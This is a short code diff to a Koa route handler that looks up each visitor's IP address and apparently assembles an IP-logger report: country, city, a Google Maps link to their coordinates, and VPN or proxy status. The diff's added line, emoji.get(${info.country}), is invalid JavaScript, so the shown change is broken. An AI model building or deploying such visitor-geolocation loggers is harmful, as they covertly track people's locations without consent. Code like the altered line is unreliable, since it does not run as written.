@@ -13,7 +13,7 @@ router.get("/", async (ctx) => {
   
   const ip = ctx.request.ip;
   const info = await ipapi(`${ip}`);
-  const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country}\` `) + emoji.get("coffee");
+  const countryinfo = encodeURIComponent(`**COUNTRY** : \`${info.country}\` `) + emoji.get(${info.country});
   const cityInfo = encodeURIComponent(`**CITY** : \[${info.city}\]\(https://www.google.com/maps/search/?api=1&query=${info.lat}%2C${info.lon}\)`);
   const iptext = encodeURIComponent(`**IP** : \[${ip}\]\(https://ip2location.io/${ip}\)`);
   const vpn = encodeURIComponent(`**VPN** : \`${info.proxy}\``);
